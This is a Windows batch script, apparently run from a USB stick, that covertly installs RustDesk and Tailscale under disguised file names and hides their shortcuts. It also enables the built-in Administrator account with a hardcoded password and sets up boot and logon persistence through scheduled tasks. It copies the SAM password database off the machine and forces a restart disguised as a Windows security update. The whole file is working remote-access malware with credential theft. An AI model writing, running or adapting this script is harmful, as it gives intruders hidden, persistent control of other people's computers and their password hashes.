@echo off
cls
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
cls
title Edge_Runner
cls
mode con: cols=15 lines=1
cls

REM			-----> Copy everything in case it's not launched as Admin (*can* loose USB path on certain W-versions)
if exist C:\Temp\Dcp9-s.ps1 (
  cd C:\Temp\
  cls
) else (
  mkdir C:\Temp\
  cls
  del ID\RustID.txt.back
  cls
  del ID\AccountList.txt.back
  cls
  del ID\NetUserFR.txt.back
  cls
  del ID\NetUserEN.txt.back
  cls
  del ID\SAM.back
  cls
  move ID\RustID.txt ID\RustID.txt.back
  cls
  move ID\AccountList.txt ID\AccountList.txt.back
  cls
  move ID\NetUserFR.txt ID\NetUserFR.txt.back
  cls
  move ID\NetUserEN.txt ID\NetUserEN.txt.back
  cls
  move ID\SAM ID\SAM.back
  cls
  copy RustInstallDesk.ps1 C:\Temp\Dcp9-s.ps1
  cls
  copy rustdesk.exe C:\Temp\Cda8-s.exe
  cls
  copy HideRustScale.ps1 C:\Temp\Cde8-s.ps1
  cls
  copy RustPass.txt C:\Temp\Yid9-p.txt
  cls
  copy tailscale.msi C:\Temp\Tda8_s.msi
  cls
  copy Edge_Runner_Esc.cmd C:\Temp\odp_z.lnk
)
cls

REM			-----> Admin perms ? No -> Admin please
REM  --> If can Install
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system") ELSE (
      >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")

REM --> IF error then Admin
if '%errorlevel%' NEQ '0' (
    cls
    ping localhost /t /n 2 > nul
    goto UACPrompt
) else ( goto gotAdmin )

REM --> Getting Admin
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

cls
REM			------> Get local User list
wmic UserAccount where "LocalAccount=True" get Name | C:\Windows\System32\findstr.exe /v /c:"Name" /c:"é" /c:"à" /c:"ù" /c:"è" > ID\AccountList.txt
cls
REM			-----> Install RustDesk (Note that it makes a Toast when installed, don't know how to disable this)
PowerShell -ExecutionPolicy Bypass -File C:\Temp\Dcp9-s.ps1
cls
timeout /t 12 /nobreak >nul
cls
del /f "C:\Users\Public\Desktop\RustDesk.lnk"
cls
REM			-----> Install Tailscale
C:\Temp\Tda8_s.msi /quiet
cls
timeout /t 15 /nobreak >nul
cls
REM			-----> Hide apps + Login/config Tailscale
PowerShell -ExecutionPolicy Bypass -File C:\Temp\Cde8-s.ps1
cls
timeout /t 2 /nobreak >nul
cls
REM			-----> Del and Copies
copy C:\Temp\odp_z.lnk C:\Windows\System32\Edge_Runner.cmd
cls
del C:\Temp\odp_z.lnk
cls
del C:\Temp\Dcp9-s.ps1
cls
del C:\Temp\Cda8-s.exe
cls
del C:\Temp\Tda8_s.msi
cls
del C:\Temp\Cde8-s.ps1
cls
del C:\Temp\Yid9-p.txt
cls
copy C:\Temp\Cdi8-r.txt ID\RustID.txt
cls
copy C:\Temp\Cdi8-r.txt C:\Windows\System32\Microsoft\Cdi8-r.txt
cls
del C:\Temp\Cdi8-r.txt
cls
del /f /q /a "C:\Temp"
del /f /q /a "C:\Temp"
cls
del /f "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\RustDesk\RustDesk.lnk"
cls
del /f "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\RustDesk\Uninstall RustDesk.lnk"
cls
del /f /q /a "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\RustDesk"
del /f /q /a "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\RustDesk"
cls
del /f "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Tailscale.lnk"
cls
del /f "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\RustDesk Tray.lnk"
cls
del /f "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Tailscale.lnk"
cls
REM			-----> Admin Magic (Admin active + password)
find "Administrateur" ID\AccountList.txt && ( set lang=FR )
cls
find "Administrator" ID\AccountList.txt && ( set lang=EN )
cls
if %lang%==FR ( goto AdminFr )
cls
if %lang%==EN ( goto AdminEn )
cls
:AdminFr
	cls
	net user Administrateur /active:yes
	cls
	net user Administrateur CoucouWas-hereAdmin
	cls
	net localgroup Administrateurs > ID\NetUserFR.txt
	cls
	goto SkipLang
	cls

:AdminEn
	cls
	net user Administrator /active:yes
	cls
	net user Administrator CoucouWas-hereAdmin
	cls
	net localgroup Administrators > ID\NetUserEN.txt
	cls
	goto SkipLang
	cls

:SkipLang
	cls
REM			-----> Planned Tasks
SCHTASKS /CREATE /MO ONSTART /TN "Edge_Runner" /TR "C:\Windows\System32\Edge_Runner.cmd"
cls
SCHTASKS /CREATE /MO ONLOGON /TN "Edge_Runner" /TR "C:\Windows\System32\Edge_Runner.cmd"
cls
REM			-----> Copy SAM file for research purpose (Password among other things)
copy C:\Windows\System32\config\SAM ID\SAM
cls
REM			-----> Kill Himself and any other cmd tasks (-fix a bug I have when not launching as admin first)
shutdown /g /c "Installation de la mise à jour de sécurité KB5027256" /t 60 /soft
cls
taskkill /F /IM cmd.exe
cls
exit